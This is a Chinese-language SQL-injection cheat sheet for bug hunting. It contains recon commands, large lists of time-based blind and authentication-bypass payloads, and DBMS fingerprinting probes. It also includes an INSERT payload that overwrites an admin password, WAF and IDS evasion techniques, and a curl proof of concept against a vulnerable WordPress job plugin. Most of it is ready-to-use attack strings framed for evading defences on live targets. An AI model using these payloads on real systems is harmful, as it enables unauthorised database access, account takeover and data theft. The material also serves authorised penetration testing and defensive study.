## 概述
1.  大多数 SQL 注入漏洞存在于基于 PHP 和 ASP 的应用程序中，这些应用程序在 PHP 和 ASPX 上运行，因此始终通过检查其页面源代码、BuitWith、Wappalyzer 扩展或在 Burp 的响应头中检查来验证网站是基于 PHP 还是 ASP。你也可以使用 curl 进行检查。
	1. gospider xxx.com | grep ".php"
	2. 谷歌dork ext:php
	3. gau | grep ".php"
	4. xscan 的爬虫 找.php
	5. burp 搜索功能 
2. 在从服务器获取数据库的每个端点中测试 SQL 注入，因为如果有数据库，那么 SQL 注入的可能性就很高，你只需查看正确的端点和正确的绕过方式。
	1. fuzz 参数
	2. `0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X` 参数 路径 http请求头 cookie / ghauri 
3. 如果没有找到 SQL 注入漏洞，请不要感到沮丧，因为我发现每个人都在简单参数中找到了 SQL 注入漏洞，你只需要成为第一个探索和测试该端点的人。
4. 使用异或负载，因为它的负载具有混淆性，可以绕过大多数防火墙 WAF。
5. 尝试在登录字段中进行大多数 SQL 注入测试，因为在登录字段中有 SQL 注入的高可能性，因为它会从数据库检查登录。
6. 始终检查存在哪种 WAF，并根据情况使用 WAF 绕过负载。
7. 不要仅通过在参数中添加 ' 来检查任何参数以获取错误，这并不总是能够引发错误，你需要动动脑筋，如果有任何从服务器数据库中获取或检查的数据，你只需检查所有的盲注负载。
8. 大多数时候，我发现这些家伙都使用 Space2Comment Tamper 来绕过 SQL 注入，但对我来说，我使用许多混合组合，但不要太长，因为这会使你的负载变得很长，从而触发 IDS、IPS 或 WAF 丢弃负载。



## 常见功能点
> 任何与数据库可能存在交互的功能点
1. 数据库交互的功能点
	1. 登录
	2. 更改密码
	3. 修改个人信息（地址 姓名 评论 删除......）
	4. 增删
	5. 搜索
	6. 。。。。
2. 遗留未处理的站点[gooogle语法](https://taksec.github.io/google-dorks-bug-bounty/)
	1. php
	2. aspx
3. ghauri --> 延时注入


> 试图操纵SQL查询可能具有的目标包括：
- 信息泄漏
- 存储数据的披露
- 存储数据的操纵
- 绕过授权控制`admin 'or '1='1`



## 工具
[Ghauri使用](https://x.com/thebinarybot/status/1768331063720387054?s=20)
[Sqlmap](https://github.com/sqlmapproject/sqlmap) 

## Payload
```bash
(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X
0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z
X'XOR(if(now()=sysdate(),//sleep(5)//,0))XOR'X
X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X
X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X
'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z
(SELECT(0)FROM(SELECT(SLEEP(6)))a)
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
(SELECT * FROM (SELECT(SLEEP(5)))a)
'%2b(select*from(select(sleep(5)))a)%2b'
CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END
');(SELECT 4564 FROM PG_SLEEP(5))--
["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23"]
DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20%27bar%27=%27bar
AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar
1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK
(select*from(select(sleep(20)))a)
'%2b(select*from(select(sleep(0)))a)%2b'
*'XOR(if(2=2,sleep(10),0))OR'
-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//
'+(select*from(select(if(1=1,sleep(20),false)))a)+'"
2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)
BENCHMARK(10000000,MD5(CHAR(116)))
'%2bbenchmark(10000000%2csha1(1))%2b'
'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true
polyglots payloads:
if(now()=sysdate(),sleep(3),0)/'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"/
if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/
```
## SQL注入基础

### 入口点检测

检测SQL注入入口点

- 错误消息：在输入字段中输入特殊字符（例如单引号'）可能会触发SQL错误。如果应用程序显示详细的错误消息，这可能表明存在潜在的SQL注入点。
```sql
1. 简单字符  
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos;  # required for XML content

2. 多重编码
%%2727
%25%27


3. Unicode characters
Unicode字符U+02BA MODIFIER LETTER DOUBLE PRIME（编码为％CA％BA）被转换为U+0022引号（“）。

Unicode字符U+02B9 MODIFIER LETTER PRIME（编码为％CA％B9）被转换为U+0027撇号（'）。
```


- 基于重言式的SQL注入：通过输入重言式（总是为真）条件，可以测试漏洞。例如，如果系统易受攻击，在用户名字段中输入admin 'OR'1 '='1可能会使您以管理员身份登录。
```sql
- 合并字符
+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP



- 逻辑测试
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
- 定时攻击：输入导致故意延迟的SQL命令（例如，使用MySQL中的`SLEEP`或`BENCHMARK`函数）可以帮助识别潜在的注入点。如果应用程序在这样的输入之后需要异常长的时间来响应，则它可能是脆弱的。

### DBMS识别

使用HTTP头、错误消息等识别数据库管理系统。
```sql
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```


### 身份验证bypass
```sql
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

### Raw Md5 SHA1
>当使用原始md5时，传递将被查询为简单字符串，而不是十六进制字符串。
```
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
允许攻击者使用`true`语句（如`' or 'SOMETHING`）创建字符串
```sql
md5("ffifdyop", true) = 'or'6�]��!r,��b�
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
```

### 多语言注入（multicontext）
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

/* MySQL only */
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```

### 路由注入
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

### 插入语句
>ON DUPLICATE KEY UPDATE关键字用于告诉MySQL当应用程序试图插入表中已经存在的行时该怎么做。我们可以使用它来更改管理员密码：
```sql
Inject using payload:
  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

The query would look like this:
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".

After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
```


## Waf

### Waf Bypass Basic

1. 白空格替代
```sql
- %20替代
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--

- 使用注释绕过
?id=1/*comment*/and/**/1=1/**/--

- 使用括号绕过
?id=(1)and(1)=(1)--

- DBMS的空格替代方案
-- Example of query where spaces were replaced by ascii characters above 0x80
♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
```

| DBMS       | ASCII characters in hexadicimal |
| ---------- | ------------------------------- |
| SQLite3    | 0A, 0D, 0C, 09, 20 |
| MySQL	5    | 09, 0A, 0B, 0C, 0D, A0, 20 |
| MySQL	3	   | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
| PostgreSQL | 0A, 0D, 0C, 09, 20 |
| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |


2. 不允许逗号
```sql
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
3. 不允许等号
```sql
?id=1 and substring(version(),1,1)like(5)
?id=1 and substring(version(),1,1)not in(4,3)
?id=1 and substring(version(),1,1)in(4,3)
?id=1 and substring(version(),1,1) between 3 and 4
```
4. 实例修改
```sql
- 大小写绕过AND
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#


- 使用等效运算符绕过
AND   -> &&
OR    -> ||
=     -> LIKE,REGEXP, BETWEEN, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING
```


## Nday

#### [Wpscan](https://wpscan.com/vulnerability/986024f0-3c8d-44d8-a9c9-1dd284d7db0d/)

1. 多汁路径  ![](media/Pasted%20image%2020240511170331.png)  
2. WP Job Portal < 2.0.6 - Unauthenticated SQLi
```bash
Setup (as admin): Create a dummy company and a job (if there are none)

Attack (as unauthenticated):
time curl -X POST --data 'jobtitle=a&city=(select*from(select(sleep(10)))a)&wpjobportallay=jobs&WPJOBPORTAL_form_search=WPJOBPORTAL_SEARCH' https://example.com/wp-job-portal-jobseeker-controlpanel/jobs/

and notice the 10s delay of the response
```

## Refernce
- [Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
